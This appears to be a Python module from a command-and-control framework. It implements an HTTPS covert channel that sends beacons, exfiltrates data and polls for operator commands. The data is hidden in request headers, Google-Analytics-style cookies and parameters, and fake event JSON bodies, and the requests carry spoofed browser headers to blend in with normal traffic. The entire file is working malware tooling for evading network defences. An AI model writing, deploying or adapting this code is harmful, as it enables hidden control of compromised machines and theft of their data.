"""
HTTPS covert channel — data hidden in legitimate-looking HTTP requests.

Encodes C2 data in HTTP headers, cookies, URL parameters, and request
bodies that mimic normal web traffic. This is the fallback channel when
DNS tunneling is blocked.

Encoding methods:
  - **Header encoding**: data in X-Request-ID, ETag, Cookie headers
  - **URL parameter encoding**: data in analytics-style URL params (utm_*, _ga, etc.)
  - **Body encoding**: data in JSON payloads mimicking API calls

Usage::

    from c2.https_covert import HTTPSCovertChannel

    channel = HTTPSCovertChannel(config={
        "endpoint": "https://analytics.example.com/collect",
    })
    channel.send_beacon(agent_id="agent-1")
    commands = channel.poll_commands()
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import random
import time
from typing import Any
from urllib.parse import urlencode

from c2.protocol import C2Protocol, C2Message, MessageType

logger = logging.getLogger(__name__)

# ── Cover URL templates (look like normal analytics/CDN requests) ────

_COVER_URLS = [
    "/collect?v=1&t=pageview&dp=%2F",          # Google Analytics style
    "/api/v2/events",                            # Analytics API style
    "/pixel.gif?r=%s",                           # Tracking pixel
    "/cdn-cgi/trace",                            # Cloudflare-style
    "/health",                                    # Health check
    "/.well-known/security.txt",                 # Standard endpoint
]

# Header names that commonly carry opaque data
_DATA_HEADERS = [
    "X-Request-ID",
    "X-Correlation-ID",
    "X-Trace-Id",
    "ETag",
    "X-Amzn-Trace-Id",
    "X-Cloud-Trace-Context",
]


class HTTPSCovertChannel:
    """HTTPS covert C2 channel.

    Parameters
    ----------
    config : dict
        Configuration with keys:
        - ``endpoint``: HTTPS URL of the C2 endpoint
        - ``shared_key``: hex-encoded 32-byte encryption key
        - ``poll_interval``: seconds between command polls
        - ``method``: encoding method (``header``, ``cookie``, ``param``, ``body``)
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._endpoint: str = str(cfg.get("endpoint", ""))
        self._poll_interval: float = float(cfg.get("poll_interval", 120))
        self._method: str = str(cfg.get("method", "header"))

        key_hex = str(cfg.get("shared_key", ""))
        shared_key = bytes.fromhex(key_hex) if key_hex else None
        self._protocol = C2Protocol(shared_key=shared_key)
        self._agent_id: str = str(cfg.get("agent_id", ""))

    def send_beacon(self) -> bool:
        """Send a beacon via HTTPS covert channel."""
        msg = C2Message(
            msg_type=MessageType.BEACON,
            agent_id=self._agent_id,
            payload={"ts": time.time()},
        )
        return self._send(msg)

    def send_data(self, data: bytes, data_type: str = "generic") -> bool:
        """Exfiltrate data via the HTTPS covert channel."""
        msg = C2Message(
            msg_type=MessageType.EXFIL,
            agent_id=self._agent_id,
            payload={"type": data_type, "data": base64.b64encode(data).decode()},
        )
        return self._send(msg)

    def poll_commands(self) -> list[C2Message]:
        """Poll for commands from the C2 controller.

        Sends a beacon and inspects the response headers/body for
        encoded command data.
        """
        try:
            import requests

            url = self._build_cover_url()
            headers = self._build_cover_headers()

            # Encode agent ID in a header for the controller to identify us
            beacon = self._protocol.encode(C2Message(
                msg_type=MessageType.BEACON,
                agent_id=self._agent_id,
            ))
            headers["X-Request-ID"] = beacon.decode("utf-8", errors="replace")

            resp = requests.get(
                url, headers=headers, timeout=15, allow_redirects=False,
            )

            # Look for encoded commands in response headers
            commands: list[C2Message] = []
            for header_name in _DATA_HEADERS:
                value = resp.headers.get(header_name, "")
                if value:
                    msg = self._protocol.decode(value.encode("utf-8"))
                    if msg and msg.msg_type == MessageType.COMMAND:
                        commands.append(msg)

            # Also check response body
            try:
                body = resp.text
                if body:
                    msg = self._protocol.decode(body.encode("utf-8"))
                    if msg and msg.msg_type == MessageType.COMMAND:
                        commands.append(msg)
            except Exception:
                pass

            return commands

        except Exception as exc:
            logger.debug("HTTPS covert poll failed: %s", exc)
            return []

    # ── Internal methods ─────────────────────────────────────────────

    def _send(self, msg: C2Message) -> bool:
        """Send an encoded message via the configured method."""
        try:
            import requests

            encoded = self._protocol.encode(msg).decode("utf-8", errors="replace")
            url = self._build_cover_url()
            headers = self._build_cover_headers()

            if self._method == "header":
                header_name = random.choice(_DATA_HEADERS)
                headers[header_name] = encoded
                requests.get(url, headers=headers, timeout=15, allow_redirects=False)

            elif self._method == "cookie":
                headers["Cookie"] = f"_ga={encoded}; _gid=GA1.2.{random.randint(1000000, 9999999)}"
                requests.get(url, headers=headers, timeout=15, allow_redirects=False)

            elif self._method == "param":
                params = {
                    "v": "1", "t": "event",
                    "ec": "ui", "ea": "click",
                    "_r": encoded,  # data hidden in analytics param
                }
                requests.get(url, params=params, headers=headers, timeout=15)

            elif self._method == "body":
                body = {
                    "event": "pageview",
                    "timestamp": int(time.time()),
                    "session_id": encoded,  # data hidden in JSON body
                    "properties": {"page": "/", "referrer": ""},
                }
                headers["Content-Type"] = "application/json"
                requests.post(url, json=body, headers=headers, timeout=15)

            return True

        except Exception as exc:
            logger.debug("HTTPS covert send failed: %s", exc)
            return False

    def _build_cover_url(self) -> str:
        """Build a legitimate-looking URL for the covert request."""
        if self._endpoint:
            return self._endpoint
        return f"https://analytics.example.com{random.choice(_COVER_URLS)}"

    def _build_cover_headers(self) -> dict[str, str]:
        """Build headers that mimic a normal browser request."""
        try:
            from stealth.network_normalizer import NetworkNormalizer
            nn = NetworkNormalizer()
            ua = nn.get_user_agent()
        except Exception:
            ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"

        return {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }

    def get_status(self) -> dict[str, Any]:
        return {
            "endpoint": self._endpoint,
            "method": self._method,
            "agent_id": self._agent_id,
        }
